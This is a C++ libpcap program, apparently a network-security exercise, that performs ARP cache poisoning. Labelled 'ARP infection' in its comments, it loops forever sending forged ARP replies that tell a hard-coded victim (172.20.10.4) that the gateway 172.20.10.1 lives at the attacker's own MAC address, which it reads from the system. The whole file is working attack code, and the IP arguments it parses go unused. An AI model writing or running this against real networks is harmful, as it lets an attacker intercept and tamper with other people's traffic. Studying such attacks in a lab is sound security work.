#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

vector<string> senders_ip;
vector<string> targets_ip;

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	//tokenizing
	for(int i=2;i<argc;i++){
		string str(argv[i]);
		if(i%2==0){ //sender ip
			senders_ip.push_back(str);
		}
		else{ //target ip
			targets_ip.push_back(str);
		}
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//나의 mac주소 구하기  
	string interface(dev);
	string my_mac_filpath = "/sys/class/net/"+interface+"/address";
	string my_mac_addr;
	ifstream ifs(my_mac_filpath);
	ifs>>my_mac_addr;
	ifs.close();
	/*ARP infection*/
	EthArpPacket packet;
	struct pcap_pkthdr* header;
	const u_char* receive_packet;
	//arp reply
	while(true){
		packet.eth_.dmac_ = Mac("D0:88:0C:68:33:76"); //victim mac
		packet.eth_.smac_ = Mac(my_mac_addr); //attacker mac
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		//victim에게 (gateway IP + 내 hostdevice mac)으로 arp cache poisoning
		packet.arp_.smac_ = Mac(my_mac_addr); //attacker mac 
		packet.arp_.sip_ = htonl(Ip("172.20.10.1")); //gateway ip
		packet.arp_.tmac_ = Mac("D0:88:0C:68:33:76"); //victim mac
		packet.arp_.tip_ = htonl(Ip("172.20.10.4")); //victim ip

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		
		int response_packet = pcap_next_ex(handle, &header, &receive_packet);
		cout<<response_packet<<endl;
	}
	

	pcap_close(handle);
}
